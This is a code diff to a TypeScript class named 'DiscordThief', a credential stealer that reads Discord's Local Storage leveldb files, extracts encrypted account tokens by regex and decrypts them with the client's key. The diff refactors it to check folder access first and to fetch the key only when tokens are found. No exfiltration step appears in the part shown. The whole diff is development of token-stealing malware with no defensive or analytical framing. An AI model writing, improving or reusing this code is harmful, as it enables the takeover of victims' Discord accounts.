@@ -1,4 +1,5 @@
 import fsPromises from 'fs/promises'
+import fs from 'fs'
 import path from 'path'
 import crypto, { Word32Array } from 'jscrypto'
 
@@ -9,12 +10,18 @@ export class DiscordThief {
     public readonly discordPath = getDiscordPath()
 
     public async getTokens() {
-        const encryptionKey = await this.getEncryptionKey()
+        const dbPath = path.join(this.discordPath, 'Local Storage/leveldb')
+
+        try {
+            await fsPromises.access(dbPath, fs.constants.R_OK)
+        } catch {
+            return []
+        }
+
+        const dbFileNames = await fsPromises.readdir(dbPath)
 
         const tokens: string[] = []
-
-        const dbPath = path.join(this.discordPath, 'Local Storage/leveldb')
-        const dbFileNames = await fsPromises.readdir(dbPath)
+        const encryptedTokens: string[] = []
 
         for (const fileName of dbFileNames) {
             let filePath: string
@@ -39,8 +46,14 @@ export class DiscordThief {
                 const matches = data.match(regex)
 
                 if (matches) {
-                    const [encryptedToken] = matches
+                    encryptedTokens.push(matches[0])
+                }
+            }
 
+            if (encryptedTokens.length > 0) {
+                const encryptionKey = await this.getEncryptionKey()
+
+                for (const encryptedToken of encryptedTokens) {
                     let token = await this.decryptToken(
                         encryptedToken,
                         encryptionKey
